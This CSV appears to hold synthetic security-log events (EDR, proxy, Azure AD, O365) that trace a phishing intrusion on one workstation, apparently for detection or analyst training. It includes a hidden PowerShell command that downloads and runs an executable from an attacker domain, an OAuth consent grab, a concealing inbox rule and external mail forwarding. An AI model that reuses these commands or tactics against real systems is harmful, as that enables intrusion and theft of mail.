@timestamp,event.dataset,event.action,host.name,host.ip,user.name,source.ip,destination.ip,destination.port,url.full,process.name,process.command_line,file.path,file.hash.sha256,email.subject,raw,json
2024-11-05T14:33:17Z,network,http,WKSTN-051,10.10.51.33,dlee,10.10.51.33,20.190.160.10,443,https://graph.microsoft.com/login,,,,,,PROXY: dlee visited https://graph.microsoft.com/login,"{""@timestamp"": ""2024-11-05T14:33:17Z"", ""event"": {""dataset"": ""network"", ""action"": ""http"", ""kind"": ""event"", ""category"": [""network""]}, ""organization"": {""name"": ""ExampleCorp""}, ""tags"": [], ""event.original"": ""PROXY: dlee visited https://graph.microsoft.com/login"", ""host"": {""name"": ""WKSTN-051"", ""ip"": [""10.10.51.33""]}, ""user"": {""name"": ""dlee"", ""email"": null}, ""source"": {""ip"": ""10.10.51.33""}, ""destination"": {""ip"": ""20.190.160.10"", ""port"": 443}, ""network"": {""transport"": ""tcp"", ""protocol"": ""http"", ""bytes"": 19709}, ""http"": {""request"": {""method"": ""GET"", ""referrer"": ""-""}, ""response"": {""status_code"": 200}}, ""url"": {""full"": ""https://graph.microsoft.com/login""}, ""user_agent"": {""original"": ""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0 Safari/537.36""}}"
2024-11-05T14:33:22Z,endpoint,process_start,WKSTN-051,10.10.51.33,dlee,,,,,mshta.exe,"mshta.exe ""C:\Users\dlee\Downloads\Invoice_Q4.html""",,,,EDR: mshta executed from HTML attachment,"{""@timestamp"": ""2024-11-05T14:33:22Z"", ""event"": {""dataset"": ""endpoint"", ""action"": ""process_start"", ""kind"": ""event"", ""category"": [""process""]}, ""organization"": {""name"": ""ExampleCorp""}, ""tags"": [], ""event.original"": ""EDR: mshta executed from HTML attachment"", ""host"": {""name"": ""WKSTN-051"", ""ip"": [""10.10.51.33""]}, ""user"": {""name"": ""dlee"", ""email"": null}, ""process"": {""name"": ""mshta.exe"", ""pid"": 6400, ""parent"": {""name"": ""explorer.exe"", ""pid"": 1800}, ""command_line"": ""mshta.exe \""C:\\Users\\dlee\\Downloads\\Invoice_Q4.html\""""}}"
2024-11-05T14:33:30Z,endpoint,file_write,WKSTN-051,10.10.51.33,dlee,,,,,,,C:\Users\dlee\AppData\Local\Temp\inv.hta,bbebfe51219cbc1efbe3df08956f35d962e58a31990f2a9d6e28cb73951f68f1,,EDR: HTA dropped to Temp (smuggled payload),"{""@timestamp"": ""2024-11-05T14:33:30Z"", ""event"": {""dataset"": ""endpoint"", ""action"": ""file_write"", ""kind"": ""event"", ""category"": [""file""]}, ""organization"": {""name"": ""ExampleCorp""}, ""tags"": [], ""event.original"": ""EDR: HTA dropped to Temp (smuggled payload)"", ""host"": {""name"": ""WKSTN-051"", ""ip"": [""10.10.51.33""]}, ""user"": {""name"": ""dlee"", ""email"": null}, ""file"": {""path"": ""C:\\Users\\dlee\\AppData\\Local\\Temp\\inv.hta"", ""hash"": {""sha256"": ""bbebfe51219cbc1efbe3df08956f35d962e58a31990f2a9d6e28cb73951f68f1""}}}"
2024-11-05T14:33:35Z,endpoint,process_start,WKSTN-051,10.10.51.33,dlee,,,,,powershell.exe,powershell.exe -NoP -W Hidden -Command iwr https://invoices-portal-secure.com/api/a -OutFile $env:TEMP\upd.exe,,,,EDR: PowerShell download from smuggling domain,"{""@timestamp"": ""2024-11-05T14:33:35Z"", ""event"": {""dataset"": ""endpoint"", ""action"": ""process_start"", ""kind"": ""event"", ""category"": [""process""]}, ""organization"": {""name"": ""ExampleCorp""}, ""tags"": [], ""event.original"": ""EDR: PowerShell download from smuggling domain"", ""host"": {""name"": ""WKSTN-051"", ""ip"": [""10.10.51.33""]}, ""user"": {""name"": ""dlee"", ""email"": null}, ""process"": {""name"": ""powershell.exe"", ""pid"": 6520, ""parent"": {""name"": ""mshta.exe"", ""pid"": 6400}, ""command_line"": ""powershell.exe -NoP -W Hidden -Command iwr https://invoices-portal-secure.com/api/a -OutFile $env:TEMP\\upd.exe""}}"
2024-11-05T14:33:42Z,endpoint,file_write,WKSTN-051,10.10.51.33,dlee,,,,,,,C:\Users\dlee\AppData\Local\Temp\upd.exe,be81264703aeab8bfbae68770251e7909453fe937189697eff35e2d9daf7ca3d,,EDR: dropped executable upd.exe,"{""@timestamp"": ""2024-11-05T14:33:42Z"", ""event"": {""dataset"": ""endpoint"", ""action"": ""file_write"", ""kind"": ""event"", ""category"": [""file""]}, ""organization"": {""name"": ""ExampleCorp""}, ""tags"": [], ""event.original"": ""EDR: dropped executable upd.exe"", ""host"": {""name"": ""WKSTN-051"", ""ip"": [""10.10.51.33""]}, ""user"": {""name"": ""dlee"", ""email"": null}, ""file"": {""path"": ""C:\\Users\\dlee\\AppData\\Local\\Temp\\upd.exe"", ""hash"": {""sha256"": ""be81264703aeab8bfbae68770251e7909453fe937189697eff35e2d9daf7ca3d""}}}"
2024-11-05T14:33:48Z,endpoint,process_start,WKSTN-051,10.10.51.33,dlee,,,,,upd.exe,%TEMP%\upd.exe /quiet,,,,EDR: dropped binary executed,"{""@timestamp"": ""2024-11-05T14:33:48Z"", ""event"": {""dataset"": ""endpoint"", ""action"": ""process_start"", ""kind"": ""event"", ""category"": [""process""]}, ""organization"": {""name"": ""ExampleCorp""}, ""tags"": [], ""event.original"": ""EDR: dropped binary executed"", ""host"": {""name"": ""WKSTN-051"", ""ip"": [""10.10.51.33""]}, ""user"": {""name"": ""dlee"", ""email"": null}, ""process"": {""name"": ""upd.exe"", ""pid"": 6601, ""parent"": {""name"": ""powershell.exe"", ""pid"": 6520}, ""command_line"": ""%TEMP%\\upd.exe /quiet""}}"
2024-11-05T14:33:53Z,network,http,WKSTN-051,10.10.51.33,dlee,10.10.51.33,82.118.242.99,443,https://invoices-portal-secure.com/cdn/logo.png,,,,,,PROXY: dlee visited https://invoices-portal-secure.com/cdn/logo.png,"{""@timestamp"": ""2024-11-05T14:33:53Z"", ""event"": {""dataset"": ""network"", ""action"": ""http"", ""kind"": ""event"", ""category"": [""network""]}, ""organization"": {""name"": ""ExampleCorp""}, ""tags"": [], ""event.original"": ""PROXY: dlee visited https://invoices-portal-secure.com/cdn/logo.png"", ""host"": {""name"": ""WKSTN-051"", ""ip"": [""10.10.51.33""]}, ""user"": {""name"": ""dlee"", ""email"": null}, ""source"": {""ip"": ""10.10.51.33""}, ""destination"": {""ip"": ""82.118.242.99"", ""port"": 443}, ""network"": {""transport"": ""tcp"", ""protocol"": ""http"", ""bytes"": 10196}, ""http"": {""request"": {""method"": ""GET"", ""referrer"": ""-""}, ""response"": {""status_code"": 200}}, ""url"": {""full"": ""https://invoices-portal-secure.com/cdn/logo.png""}, ""user_agent"": {""original"": ""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0 Safari/537.36""}}"
2024-11-05T14:34:20Z,network,http,WKSTN-051,10.10.51.33,dlee,10.10.51.33,82.118.242.99,443,https://invoices-portal-secure.com/login,,,,,,PROXY: dlee visited https://invoices-portal-secure.com/login,"{""@timestamp"": ""2024-11-05T14:34:20Z"", ""event"": {""dataset"": ""network"", ""action"": ""http"", ""kind"": ""event"", ""category"": [""network""]}, ""organization"": {""name"": ""ExampleCorp""}, ""tags"": [], ""event.original"": ""PROXY: dlee visited https://invoices-portal-secure.com/login"", ""host"": {""name"": ""WKSTN-051"", ""ip"": [""10.10.51.33""]}, ""user"": {""name"": ""dlee"", ""email"": null}, ""source"": {""ip"": ""10.10.51.33""}, ""destination"": {""ip"": ""82.118.242.99"", ""port"": 443}, ""network"": {""transport"": ""tcp"", ""protocol"": ""http"", ""bytes"": 20549}, ""http"": {""request"": {""method"": ""GET"", ""referrer"": ""-""}, ""response"": {""status_code"": 200}}, ""url"": {""full"": ""https://invoices-portal-secure.com/login""}, ""user_agent"": {""original"": ""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0 Safari/537.36""}}"
2024-11-05T14:34:42Z,network,http,WKSTN-051,10.10.51.33,dlee,10.10.51.33,20.190.160.10,443,https://graph.microsoft.com/oauth/authorize,,,,,,PROXY: dlee visited https://graph.microsoft.com/oauth/authorize,"{""@timestamp"": ""2024-11-05T14:34:42Z"", ""event"": {""dataset"": ""network"", ""action"": ""http"", ""kind"": ""event"", ""category"": [""network""]}, ""organization"": {""name"": ""ExampleCorp""}, ""tags"": [], ""event.original"": ""PROXY: dlee visited https://graph.microsoft.com/oauth/authorize"", ""host"": {""name"": ""WKSTN-051"", ""ip"": [""10.10.51.33""]}, ""user"": {""name"": ""dlee"", ""email"": null}, ""source"": {""ip"": ""10.10.51.33""}, ""destination"": {""ip"": ""20.190.160.10"", ""port"": 443}, ""network"": {""transport"": ""tcp"", ""protocol"": ""http"", ""bytes"": 20135}, ""http"": {""request"": {""method"": ""GET"", ""referrer"": ""-""}, ""response"": {""status_code"": 200}}, ""url"": {""full"": ""https://graph.microsoft.com/oauth/authorize""}, ""user_agent"": {""original"": ""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0 Safari/537.36""}}"
2024-11-05T14:35:17Z,network,dns,WKSTN-051,10.10.51.33,dlee,10.10.51.33,,,,,,,,,DNS browse graph.microsoft.com->20.190.160.10,"{""@timestamp"": ""2024-11-05T14:35:17Z"", ""event"": {""dataset"": ""network"", ""action"": ""dns"", ""kind"": ""event"", ""category"": [""network""]}, ""organization"": {""name"": ""ExampleCorp""}, ""tags"": [], ""event.original"": ""DNS browse graph.microsoft.com->20.190.160.10"", ""host"": {""name"": ""WKSTN-051"", ""ip"": [""10.10.51.33""]}, ""user"": {""name"": ""dlee"", ""email"": null}, ""source"": {""ip"": ""10.10.51.33""}, ""dns"": {""question"": {""name"": ""graph.microsoft.com""}, ""answers"": [{""data"": ""20.190.160.10"", ""ttl"": 60}]}}"
2024-11-05T14:35:19Z,network,http,WKSTN-051,10.10.51.33,dlee,10.10.51.33,20.190.160.10,443,https://graph.microsoft.com/login,,,,,,PROXY: dlee visited https://graph.microsoft.com/login,"{""@timestamp"": ""2024-11-05T14:35:19Z"", ""event"": {""dataset"": ""network"", ""action"": ""http"", ""kind"": ""event"", ""category"": [""network""]}, ""organization"": {""name"": ""ExampleCorp""}, ""tags"": [], ""event.original"": ""PROXY: dlee visited https://graph.microsoft.com/login"", ""host"": {""name"": ""WKSTN-051"", ""ip"": [""10.10.51.33""]}, ""user"": {""name"": ""dlee"", ""email"": null}, ""source"": {""ip"": ""10.10.51.33""}, ""destination"": {""ip"": ""20.190.160.10"", ""port"": 443}, ""network"": {""transport"": ""tcp"", ""protocol"": ""http"", ""bytes"": 11153}, ""http"": {""request"": {""method"": ""GET"", ""referrer"": ""-""}, ""response"": {""status_code"": 200}}, ""url"": {""full"": ""https://graph.microsoft.com/login""}, ""user_agent"": {""original"": ""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0 Safari/537.36""}}"
2024-11-05T14:35:44Z,network,http,WKSTN-051,10.10.51.33,dlee,10.10.51.33,20.190.160.10,443,https://graph.microsoft.com/signin-oidc,,,,,,PROXY: dlee visited https://graph.microsoft.com/signin-oidc,"{""@timestamp"": ""2024-11-05T14:35:44Z"", ""event"": {""dataset"": ""network"", ""action"": ""http"", ""kind"": ""event"", ""category"": [""network""]}, ""organization"": {""name"": ""ExampleCorp""}, ""tags"": [], ""event.original"": ""PROXY: dlee visited https://graph.microsoft.com/signin-oidc"", ""host"": {""name"": ""WKSTN-051"", ""ip"": [""10.10.51.33""]}, ""user"": {""name"": ""dlee"", ""email"": null}, ""source"": {""ip"": ""10.10.51.33""}, ""destination"": {""ip"": ""20.190.160.10"", ""port"": 443}, ""network"": {""transport"": ""tcp"", ""protocol"": ""http"", ""bytes"": 2952}, ""http"": {""request"": {""method"": ""GET"", ""referrer"": ""-""}, ""response"": {""status_code"": 200}}, ""url"": {""full"": ""https://graph.microsoft.com/signin-oidc""}, ""user_agent"": {""original"": ""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0 Safari/537.36""}}"
2024-11-05T14:36:00Z,identity,oauth_consent,,,dlee,82.118.242.99,,,,,,,,,"AzureAD: OAuth consent granted to app 'InvoiceViewer' scopes=Mail.Read, Files.Read","{""@timestamp"": ""2024-11-05T14:36:00Z"", ""event"": {""dataset"": ""identity"", ""action"": ""oauth_consent"", ""kind"": ""event"", ""category"": [""authentication""], ""outcome"": ""success""}, ""organization"": {""name"": ""ExampleCorp""}, ""tags"": [], ""event.original"": ""AzureAD: OAuth consent granted to app 'InvoiceViewer' scopes=Mail.Read, Files.Read"", ""user"": {""name"": ""dlee"", ""email"": null}, ""source"": {""ip"": ""82.118.242.99""}, ""service"": {""name"": ""azuread""}}"
2024-11-05T14:36:13Z,network,http,WKSTN-051,10.10.51.33,dlee,10.10.51.33,20.190.160.10,443,https://graph.microsoft.com/cdn/logo.png,,,,,,PROXY: dlee visited https://graph.microsoft.com/cdn/logo.png,"{""@timestamp"": ""2024-11-05T14:36:13Z"", ""event"": {""dataset"": ""network"", ""action"": ""http"", ""kind"": ""event"", ""category"": [""network""]}, ""organization"": {""name"": ""ExampleCorp""}, ""tags"": [], ""event.original"": ""PROXY: dlee visited https://graph.microsoft.com/cdn/logo.png"", ""host"": {""name"": ""WKSTN-051"", ""ip"": [""10.10.51.33""]}, ""user"": {""name"": ""dlee"", ""email"": null}, ""source"": {""ip"": ""10.10.51.33""}, ""destination"": {""ip"": ""20.190.160.10"", ""port"": 443}, ""network"": {""transport"": ""tcp"", ""protocol"": ""http"", ""bytes"": 17754}, ""http"": {""request"": {""method"": ""GET"", ""referrer"": ""-""}, ""response"": {""status_code"": 200}}, ""url"": {""full"": ""https://graph.microsoft.com/cdn/logo.png""}, ""user_agent"": {""original"": ""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0 Safari/537.36""}}"
2024-11-05T14:36:20Z,identity,mailbox_rule_created,,,dlee,,,,,,,,,,O365: inbox rule created name='InvoicesArchive' move messages with 'invoice' to RSS Feeds,"{""@timestamp"": ""2024-11-05T14:36:20Z"", ""event"": {""dataset"": ""identity"", ""action"": ""mailbox_rule_created"", ""kind"": ""event""}, ""organization"": {""name"": ""ExampleCorp""}, ""tags"": [], ""event.original"": ""O365: inbox rule created name='InvoicesArchive' move messages with 'invoice' to RSS Feeds"", ""user"": {""name"": ""dlee"", ""email"": null}}"
2024-11-05T14:36:30Z,identity,mail_forwarding_enabled,,,dlee,,,,,,,,,,O365: mailbox forwarding enabled to external address invoices.archive@protonmail.com,"{""@timestamp"": ""2024-11-05T14:36:30Z"", ""event"": {""dataset"": ""identity"", ""action"": ""mail_forwarding_enabled"", ""kind"": ""event""}, ""organization"": {""name"": ""ExampleCorp""}, ""tags"": [], ""event.original"": ""O365: mailbox forwarding enabled to external address invoices.archive@protonmail.com"", ""user"": {""name"": ""dlee"", ""email"": null}}"
